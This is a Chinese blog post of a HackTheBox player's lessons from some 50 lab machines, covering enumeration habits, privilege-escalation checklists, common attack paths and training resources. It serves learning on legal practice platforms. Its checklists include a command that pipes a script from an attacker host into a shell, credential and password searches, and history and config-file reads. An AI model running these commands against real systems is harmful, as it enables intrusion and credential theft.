---
title: [实战笔记] 打了 50 台靶机，我学到了什么？
url: https://mp.weixin.qq.com/s/42Xhwg59Ll23xgl-Eoqg2g
source: Doonsec's feed
date: 2026-02-18
fetch_date: 2026-02-19T04:13:14.192642
---

# [实战笔记] 打了 50 台靶机，我学到了什么？

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/L7VicJKsiaibFDO7bnyXI1OXU5Q7O7yA8arQC8tBiawibuLWhmg5IcULTq7QGu7mru0ldxwaibiaDtYOKiaLicYPzpLSCVnXoEbKP91EOOZvmlvqY2tc/0?wx_fmt=jpeg)

# [实战笔记] 打了 50 台靶机，我学到了什么？

原创

丘驰
丘驰

极客零零七

![]()

在小说阅读器中沉浸阅读

> 这不是一篇教程。这是我在 HackTheBox 打了几十台靶机之后，想对一年前的自己说的话。
>
> 如果你刚开始玩 CTF 或 HTB，这篇文章能帮你少走 6 个月弯路。

---

### 写在前面

我第一次打 HTB 靶机的时候，花了 4 个小时，跑了 nmap，开了 Burp，然后——不知道下一步该干什么。

我以为是技术不够，于是去找更多教程、看更多文章。两周后，我再次打开那台靶机，用了 1 小时拿下。不是因为我学到了什么新技术，而是我学会了**怎么看问题**。

靶机教会我的最重要的东西，不是工具命令，而是思维方式。

---

### 一、最颠覆我认知的 3 个认知

#### 认知1："卡住了"不是技术不行，是枚举没做完

我问过身边很多打靶机的朋友，他们卡住的原因，90% 都是同一个：**枚举没做到位**。

不是漏扫了一个端口，就是漏看了一个目录，要么就是找到密码没到处试。

每次我拿去求助的靶机，高手看一眼经常说的是："你有没有看 /opt 目录？" 或者 "你扫了 UDP 吗？"

**枚举是一种态度，不是一个动作。** 你不是在"扫一下"，而是在系统地排除所有可能性。

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9

```
我的枚举清单（Linux 靶机）：
[ ] 全端口扫描（nmap -p- 不只是 top 1000）[ ] 每个 Web 服务都跑 gobuster/feroxbuster[ ] robots.txt / sitemap.xml 必看[ ] 查看源码（包括所有 JS 文件）[ ] 框架版本 → searchsploit[ ] 查目录下所有用户的历史记录[ ] 拿到 Shell 后：sudo -l / SUID / cron / pspy
```

#### 认知2：找到密码之后，马上到处试

我在 HTB Resolute 靶机上卡了 2 个小时，找到了一个用户的密码却没有想到去试其他服务。后来发现，这个密码同时也是 WinRM 的密码。

**凭据重用在真实环境中的比例高得惊人。** HTB 有意模拟这一点。

我现在的习惯：找到任何密码，第一件事不是看是否能登录当前服务，而是**把它在所有可能的入口上试一遍**——SSH、FTP、RDP、WinRM、SMB、Web 登录页面。

#### 认知3：看不懂 BloodnHound 输出等于没跑 BloodHound

刚开始打 AD 靶机，我把 BloodHound 当成仪式感工具——跑了，上传了，开了，然后找了半天"最短路径"图，不知道怎么利用。

BloodHound 的价值在于看"节点上的 Abuse Info"，右键任何关系边，有详细的利用说明。这才是重点，不是那张漂亮的图。

---

### 二、真实踩坑记录（原版）

#### 坑1：只扫常见端口

HTB Retired 靶机，关键服务在 1337 端口。我只跑了 nmap 默认扫描，整整两小时没有任何线索。

**教训**：永远用 `-p-` 全端口扫描，哪怕慢也值。

* 1
* 2
* 3
* 4

```
# 两步走：先快速全端口找开放端口，再精细扫nmap -p- --min-rate 5000 <IP> -oN ports.txtports=$(cat ports.txt | grep "open" | awk -F'/' '{print $1}' | tr '\n' ',')nmap -sV -sC -p$ports <IP>
```

#### 坑2：看到 403 就放弃

某台靶机的管理后台在 `/admin/` 返回 403，我以为没有访问权限就放弃了。结果 `/admin/login` 可以直接访问，后台用默认密码登进去了。

**教训**：对 403 的目录继续跑 gobuster，很多子路径是可访问的。

* 1

```
gobuster dir -u http://target.com/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

#### 坑3：JS 文件是金矿

一台靶机的 API 密钥藏在某个 JS 文件里，但是主页面很普通，我没有仔细看。

**教训**：浏览器开发者工具 → Sources → 看所有 JS 文件。内部 API 端点、密钥、硬编码凭据都可能在里面。

* 1
* 2

```
# 自动化提取 JS 中的端点python3 linkfinder.py -i http://target.com/main.js -o cli
```

#### 坑4：拿到 shell 就开始提权，没完成枚举

某台靶机，我拿到 www-data 的 shell 之后，立刻跑 SUID 扫描，忙活了一个小时，结果正确答案是 `/opt/` 下有一个 root 执行的 Python 脚本，而且对所有人可写。

**教训**：拿到 Shell 后，先 linpeas，看完高亮再动手。

#### 坑5：密码破解不用规则

`hashcat -m 0 hash.txt rockyou.txt` 跑了 10 分钟没结果，以为密码太复杂放弃了。

别人问了一句："你加规则了吗？"

加了 `best64.rule` 之后 30 秒出来。

**教训**：字典 + 规则 >> 纯字典。

* 1

```
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### 坑6：Windows 靶机忽略 `whoami /priv`

某台靶机我以 IIS 服务账户的身份拿到了 shell，翻了半天注册表找配置错误，没找到什么。后来被人告知：

"你 `whoami /priv` 有没有？"

`SeImpersonatePrivilege: Enabled`。

GodPotato 一行命令，直接 SYSTEM。

**教训**：Windows 靶机拿到 Shell 的第二条命令就是 `whoami /priv`。

---

### 三、10 条最高频攻击路径（按概率排序）

打完几十台靶机，我能给你一个粗略的概率排名：

1. **Web 漏洞 → 初始立足点**（Linux 靶机几乎必走）

* 目录扫描 + 文件上传/LFI/SQLi/RCE

2. **凭据重用**（比你想象的高频）

* 找到一处密码，试所有服务

3. **sudo 配置错误**（Linux 提权第一关必查）

* `sudo -l` + GTFOBins

4. **SeImpersonatePrivilege**（Windows 服务账户提权标配）

* GodPotato / PrintSpoofer

5. **服务版本漏洞**（老靶机非常常见）

* nmap -sV → searchsploit → GitHub PoC

6. **SUID 二进制**（Linux 靶机提权第二关）

* `find / -perm -4000` + GTFOBins

7. **Cron 任务脚本可写**（pspy 发现）
8. **AD：Kerberoasting / AS-REP Roasting**（域环境必查）
9. **BloodHound ACL 路径**（AD 靶机进阶）
10. **内核漏洞**（最后手段，PwnKit 几乎通杀）

---

### 四、我的标准工作流

#### 初始侦察（永远从这里开始）

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8

```
# 快速全端口nmap -p- --min-rate 5000 <IP> -oN all_ports.txt
# 精细扫描nmap -sV -sC -p <ports> <IP> -oN detail.txt
# Web 服务gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o gobuster.txt
```

#### 拿到 Linux Shell 后的清单

* 1
* 2
* 3
* 4
* 5
* 6
* 7
* 8
* 9

```
id &&sudo-l # 第一步find / -perm -4000 -type f 2>/dev/null      # SUIDcat /etc/crontab && ls /etc/cron.*          # croncat ~/.bash_history # 历史命令find / -name ".env" -o -name "*.config" 2>/dev/null | head -20# 如果以上没发现，上 linpeascurl http://<attacker>/linpeas.sh | sh# 如果 linpeas 也没有，上 pspy./pspy64
```

#### 拿到 Windows Shell 后的清单

* 1
* 2
* 3
* 4
* 5
* 6
* 7

```
whoami && whoami /priv && whoami /groups   第一步systeminfo | findstr /B /C:"OS Version"   内核版本wmic service get name,pathname,startname   服务信息cmdkey /list 保存的凭据findstr /si password *.txt *.xml *.ini     密码搜索# 以上完成，上 WinPEAS.\winPEASx64.exe
```

---

### 五、资源推荐（帮我提升最多的）

**平台**

* **HackTheBox**（首选）：靶机质量高，有 Pro Labs 模拟真实环境
* **TryHackMe**：适合初学者，有引导式学习路径
* **OSCP PG Practice**：最接近 OSCP 考试环境

**必收藏的网站**

| 网站 | 用途 |
| --- | --- |
| GTFOBins[https://gtfobins.github.io/] | SUID/sudo 利用，打靶必开 |
| LOLBAS[https://lolbas-project.github.io/] | Windows 内置工具利用 |
| HackTricks[https://book.hacktricks.xyz/] | 渗透测试完整知识库 |
| revshells.com[https://www.revshells.com/] | 反弹 shell 一键生成 |
| CrackStation[https://crackstation.net/] | 哈希在线查询 |
| IppSec YouTube[https://www.youtube.com/c/ippsec] | HTB 题解视频，学到的不只是答案 |
| 0xdf blog[https://0xdf.gitlab.io/] | 文字版高质量 writeup |

**书单**

* 《黑客：计算机革命的英雄》— 技术人文，补充背景认知
* 《Hacking: The Art of Exploitation》— 底层原理，汇编级理解
* OSCP 官方材料（PWK）— 最系统的入门到进阶路径

---

### 六、给自己的一封信

我第一台靶机打了 5 个小时没有进展，最后看了提示才完成。当时觉得很挫败。

现在想想，那台靶机给我的最大收获不是技术，是**舒适区边界的感知**——原来这就是我目前的水平，这就是我需要补的地方。

靶机最妙的地方在于：它是设计过的，有已知答案，有学习路径。每一次卡住都是有价值的反馈，不是挫折，是导航。

有一件事我想对刚开始打靶机的你说：

**不要羞于看 Writeup，但要先认真努力过。** 正确的姿势是：卡住 1 小时 → 看提示/Writeup → 明白思路 → 自己复现一遍 → 记录总结。"看答案学习"和"抄答案交作业"是两件完全不同的事。

---

### 关键收获（3 条）

1. **枚举 > 一切**：卡住的时候不要急着换技术，先把枚举补完。99% 的情况下答案就在某个没看完的地方。
2. **打靶机是主动学习**：不是刷题积累题量，而是每台靶机后认真总结"这台靶机教会了我什么"。
3. **社区是最好的老师**：Discord、Telegram 群里的提示，往往比教程更精准——因为他们踩过同样的坑。

---

> 回复 `靶机` 获取 HTB 靶机推荐清单（按技术点分类，从 Easy 到 Hard 逐步进阶）
>
> 回复 `提权` 获取 Windows+Linux 提权速查 PDF
>
> 你在打靶机的过程中遇到过什么印象深刻的坑？留言聊聊，我可能也踩过 :)
>
> 关注「极客零零七」，每月真实靶机 writeup + 踩坑记录

---

### [马要来了，想跟关注了我的427个粉丝说几句心里话（文末留言赢大奖）](https://mp.weixin.qq.com/s?__biz=Mzk2NDgwNjA2NA==&mid=2247486129&idx=1&sn=a65166573442cd17ff807d15837023ce&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/L7VicJKsiaibFAoPbMA2ibuItrDF2baKL4dhYOKyribd9Vm0UvaAkSpCM4xQJT7ibd0aK59fedLvT7YefbNBbGebFzcL8iaC1N5St67HXFl4Wpt7ibs/640?wx_fmt=png&from=appmsg)](https://mp.weixin.qq.com/s?__biz=Mzk2NDgwNjA2NA==&mid=2247486129&idx=1&sn=a65166573442cd17ff807d15837023ce&scene=21#wechat_redirect)

### 附：HTB 靶机推荐（按技术点分类）

#### Linux 提权入门

| 靶机 | 难度 | 核心技术 |
| --- | --- | --- |
| Bashed | Easy | sudo + Python + Web Shell |
| Nibbles | Easy | sudo + bash 脚本 |
| Curling | Easy | Joomla + Cron |
| Tartarsauce | Medium | WP 插件 + sudo tar 通配符 |

#### Windows 提权入门

| 靶机 | 难度 | 核心技术 |
| --- | --- | --- |
| Devel | Easy | IIS + 内核提权 |
| Optimum | Easy | HttpFileServer + Sherlock |
| SecNotes | Medium | SMB + UNC 路径 |

#### AD 攻击入门

| 靶机 | 难度 | 核心技术 |
| --- | --- | --- |
| Forest | Easy | AS-REP Roasting + DCSync |
| Active | Easy | Kerberoasting + GPP 密码 |
| Sauna | Easy | AS-REP + 凭据转储 |
| Resolute | Medium | 枚举 + 凭据重用 |

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/vRBYx9F4Zf6FIrWa8y7Avoujo7CWGRp0ICqvZGJIdtQgzNlzefeHiaeibmBZbcl5Oyj9wBNTsPiczEeKCelS9xjibw/0?wx_fmt=png)

极客零零七

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vRBYx9F4Zf6FIrWa8y7Avoujo7CWGRp0ICqvZGJIdtQgzNlzefeHiaeibmBZbcl5Oyj9wBNTsPiczEeKCelS9xjibw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过